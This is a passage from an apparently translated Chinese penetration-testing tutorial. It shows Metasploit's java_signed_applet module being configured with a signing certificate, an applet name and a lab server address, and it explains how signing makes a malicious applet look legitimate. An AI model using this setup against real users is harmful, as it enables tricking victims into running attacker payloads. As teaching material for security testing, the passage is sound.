  \                                                randomly generated)\n   SSLVersion\
  \      SSL3             no        Specify the version of SSL that should be used\n\
  \                                                (accepted: SSL2, SSL3, TLS1)\n\
  \  ❷SigningCert                      no        Path to a signing certificate in\
  \ PEM or PKCS12\n                                                (.pfx) format\n\
  \   SigningKey                       no        Path to a signing key in PEM format\n\
  \   SigningKeyPass                   no        Password for signing key (required\
  \ if SigningCert\n                                                is .pfx)\n   URIPATH\
  \                          no        The URI to use for this exploit (default is\n\
  \                                                random)\n\nExploit target:\n\n\
  \   Id  Name\n   --  ----\n  ❸1   Windows x86 (Native Payload)\n\nmsf  exploit(java_signed_applet)\
  \ > set APPLETNAME BulbSec\nAPPLETNAME => Bulb Security\nmsf  exploit(java_signed_applet)\
  \ > set SRVHOST 192.168.20.9\nSRVHOST => 192.168.20.9\nmsf  exploit(java_signed_applet)\
  \ > set SRVPORT 80\nSRVPORT => 80\n```\n\n旧版本的 Java 允许我们使用 ❶ 所示的 `CERTCN` 选项，说明\
  \ applet 是由我们选择的任何实体签名的。新版本的 Java（例如安装在 Windows 7 目标机上的）除非我们使用信任的签名证书签名 applet（可以在\
  \ ❷ 处指定），否则会提示签名者未知。如果设置了此选项，它将覆盖 `CERTCN` 选项。如果我们拥有受信任的签名证书或从目标处获取了证书，我们可以让 applet\
  \ 看起来更合法，但在本示例中，我们将 applet 保持自签名。\n\n\n\n\n\n如 ❸ 所示，该模块的默认目标是 Windows 系统。然而，如示例\
  \ 10-19 所示，我们可以为运行 JRE 的其他平台使用 payload。\n\n#### 示例 10-19. 使用 Java payload\n\n```\n\
  msf  exploit(java_signed_applet) > show targets\n\nExploit targets:\n\n   Id  Name\n\
